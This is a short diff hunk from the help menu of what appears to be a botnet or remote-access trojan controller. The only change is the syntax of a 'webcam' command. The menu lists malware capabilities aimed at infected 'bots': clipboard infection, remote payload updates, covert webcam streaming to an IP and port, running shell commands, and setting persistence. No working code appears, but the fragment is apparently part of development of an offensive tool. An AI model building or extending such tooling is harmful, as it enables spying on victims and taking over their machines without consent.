@@ -8,7 +8,7 @@
           ║     infectclipboard <botName> <url>            ║     Admin privileges required                 ║
           ║     stopinfectclipboard <botName>              ║     Admin privileges required                 ║  
           ║     updatepayload <botName> <url>              ║     Admin privileges required                 ║
-          ║     webcam <botName> <ip> <port>               ║     Stream webcam footage                     ║
+          ║     webcam <ip> <port>                         ║     Stream webcam footage                     ║
           ║     kill                                       ║     Stop client from listening                ║
           ║     shell <botName> <cmd>                      ║     Run shell commands                        ║
           ║     persistence <botName>                      ║     Set persistence                           ║
